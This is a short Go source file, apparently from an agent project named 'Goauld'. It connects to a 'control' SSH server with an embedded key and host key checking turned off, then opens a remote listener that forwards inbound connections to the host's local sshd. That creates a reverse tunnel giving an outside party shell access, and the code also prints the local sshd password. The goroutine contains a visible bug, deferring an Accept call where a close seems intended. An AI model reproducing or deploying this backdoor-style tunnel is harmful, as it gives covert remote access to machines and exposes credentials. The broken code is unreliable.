package ssh

import (
	"Goauld/agent/agent"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"net"
)

func connect() error {

	privateKey, err := ssh.ParsePrivateKey([]byte(agent.Get().SShPrivateKey))
	if err != nil {
		return err
	}
	sshConfig := &ssh.ClientConfig{
		User:            agent.Get().Id,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(privateKey)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", agent.Get().ControlSshServer(), sshConfig)

	if err != nil {
		return fmt.Errorf("failed to dial SSH server: %w", err)
	}
	defer client.Close()

	remoteListener, err := client.Listen("tcp", agent.Get().RemoteForwardedSshdAddress())
	if err != nil {
		return fmt.Errorf("failed to start remote listener: %w", err)
	}

	remotePort := remoteListener.Addr().(*net.TCPAddr).Port
	fmt.Printf("remote port is %d\n", remotePort)
	fmt.Printf("LocalSshPassword is %s\n", agent.Get().LocalSShdPassword())
	defer remoteListener.Close()

	for {
		remoteConn, err := remoteListener.Accept()
		if err != nil {
			// TODO faire du throttle si on garde l'erreur, voir pour cuoper proprement après un temp ?
			fmt.Printf("failed to accept remote connection: %v", err)
			continue
		}

		go func() {
			defer remoteListener.Accept()

			localConn, err := net.Dial("tcp", agent.Get().LocalSShdAddress())
			if err != nil {
				fmt.Printf("failed to connect to locla service: %v", err)
				return
			}
			defer localConn.Close()
			go io.Copy(localConn, remoteConn)
			io.Copy(remoteConn, localConn)
		}()

	}
	return nil
}
func Connect() {
	go connect()
}
